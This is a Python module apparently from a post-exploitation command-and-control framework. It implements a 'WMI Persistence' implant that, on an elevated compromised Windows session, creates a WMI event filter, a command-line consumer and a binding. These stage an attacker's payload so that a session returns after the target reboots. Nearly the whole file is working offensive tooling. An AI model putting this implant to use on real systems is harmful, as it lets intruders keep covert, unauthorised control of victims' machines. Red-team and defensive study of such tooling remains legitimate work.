import core.job
import core.implant
import uuid

class WMIPersistJob(core.job.Job):
    def create(self):
        if self.session_id == -1:
            self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
            return False
        if self.session.elevated != 1:
            self.error("0", "This job requires an elevated session.", "Not elevated", "")
            return False

    def report(self, handler, data, sanitize = False):
        task =  handler.get_header("Task", False)
        data = data.decode()

        if task == "CreateFilter":
            handler.reply(200)
            if data:
                self.shell.print_good("__EventFilter created!")
            else:
                self.shell.print_error("__EventFilter could not be created, this implant will probably fail :/")
            return

        if task == "CreateConsumer":
            handler.reply(200)
            if data:
                self.shell.print_good("CommandLineEventConsumer created!")
            else:
                self.shell.print_error("CommandLineEventConsumer could not be created, this implant will probably fail :/")
            return

        if task == "CreateBinding":
            handler.reply(200)
            if data:
                self.shell.print_good("__FilterToConsumerBinding created! Persistence has been established! If the target reboots, a session should come back 4-5 minutes later :)")
            else:
                self.shell.print_error("__FilterToConsumerBinding could not be created, this implant will probably fail :/")
            return

        if task == "RemovePersistence":
            handler.reply(200)
            if data:
                self.shell.print_good("Persistence removed successfully.")
            else:
                self.shell.print_error("Could not remove persistence :/")
            return

        if data == "Complete":
            super(WMIPersistJob, self).report(handler, data)
            
        handler.reply(200)

    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        # self.shell.print_plain(self.data)
        pass

class WMIPersistImplant(core.implant.Implant):

    NAME = "WMI Persistence"
    DESCRIPTION = "Creates persistence using a WMI subscription"
    AUTHORS = ["TheNaterz"]

    def load(self):
        self.options.register("PAYLOAD", "", "payload to stage")
        self.options.register("CMD", "", "command", hidden=True)
        self.options.register("CLEANUP", "false", "will remove the created user", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)

    def job(self):
        return WMIPersistJob

    def run(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return

        self.options.set("CMD", payload)
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/persist/wmi.js", self.options)

        self.dispatch(payloads, self.job)
